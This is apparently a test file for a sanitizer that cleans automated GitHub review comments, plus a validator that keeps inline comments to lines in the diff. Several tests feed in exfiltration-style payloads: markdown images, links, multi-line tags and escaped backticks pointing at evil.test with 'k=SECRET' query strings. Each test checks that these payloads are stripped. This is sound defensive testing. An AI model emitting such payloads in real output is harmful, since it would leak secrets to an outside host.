import { describe, expect, test } from "bun:test";
import { validateReview } from "../scripts/lib/review";
import { sanitize } from "../scripts/lib/sanitize";

describe("sanitize", () => {
  test("mentions do not ping anyone", () => {
    expect(sanitize("thanks @octocat and @org/team")).not.toMatch(/@octocat|@org/);
    expect(sanitize("email me at a@b.com")).toContain("a@b.com");
  });

  test("images and foreign links cannot carry data out", () => {
    const out = sanitize("![x](https://evil.test/p?k=SECRET) <img src=https://evil.test/a> [docs](https://evil.test/?d=1) https://evil.test/x");
    expect(out).not.toContain("evil.test");
    expect(out).not.toContain("<img");
  });

  test("multi-line tags, scheme-less URLs, nested links and www autolinks are removed", () => {
    for (const input of [
      '<img\nsrc="//evil.test/?k=SECRET">',
      '<a\nhref="//evil.test/?k=S">click</a>',
      "[![x](a)](//evil.test/?k=SECRET)",
      "see www.evil.test/?k=SECRET",
      "plain //evil.test/x",
    ]) {
      expect(sanitize(input)).not.toContain("evil.test");
      expect(sanitize(input)).not.toMatch(/<(img|a)\b/);
    }
  });

  test("code is left exactly as written, since GitHub renders nothing inside it", () => {
    expect(sanitize("returns `\"\"` for `max <= 0`")).toBe("returns `\"\"` for `max <= 0`");
    const block = "```ts\nif (a < b && c > d) ping(\"@octocat\");\n```";
    expect(sanitize(`Fix:\n${block}`)).toBe(`Fix:\n${block}`);
  });

  test("text outside code is still cleaned next to code", () => {
    const out = sanitize("`a <= b` and <img src=//evil.test/x> @octocat");
    expect(out).toStartWith("`a <= b`");
    expect(out).not.toContain("evil.test");
    expect(out).not.toContain("@octocat");
  });

  test("GitHub links survive", () => {
    expect(sanitize("see https://github.com/a/b/issues/1")).toContain("https://github.com/a/b/issues/1");
  });

  test("a tag line cannot turn the code next to it into live HTML", () => {
    const out = sanitize("<details>\n`<img src=//evil.test/x>`");
    expect(out).not.toMatch(/^<details>/);
  });

  test("a backslash-escaped backtick does not hide a tag", () => {
    expect(sanitize("\\`<img src=//evil.test/x>\\`")).not.toMatch(/<img/);
  });

  test("closing keywords cannot close other issues", () => {
    expect(sanitize("Fixes #12 and closes other/repo#3")).not.toMatch(/Fixes #12|closes other\/repo#3/);
    expect(sanitize("fixes https://github.com/o/r/issues/5")).not.toContain("issues/5");
  });
});

describe("validateReview", () => {
  const diff = [
    "diff --git a/src/a.ts b/src/a.ts",
    "--- a/src/a.ts",
    "+++ b/src/a.ts",
    "@@ -10,3 +10,4 @@ fn",
    " keep",
    "-old",
    "+new",
    "+added",
    " tail",
  ].join("\n");

  test("inline comments must point at lines in the diff", () => {
    const review = validateReview(
      {
        summary: "Looks fine",
        comments: [
          { path: "src/a.ts", line: 11, body: "check this" },
          { path: "src/a.ts", line: 99, body: "far away" },
          { path: "other.ts", line: 1, body: "not in diff" },
        ],
      },
      diff,
    );
    expect(review.comments).toEqual([{ path: "src/a.ts", line: 11, body: "check this" }]);
    expect(review.summary).toContain("far away");
    expect(review.summary).toContain("not in diff");
  });
});
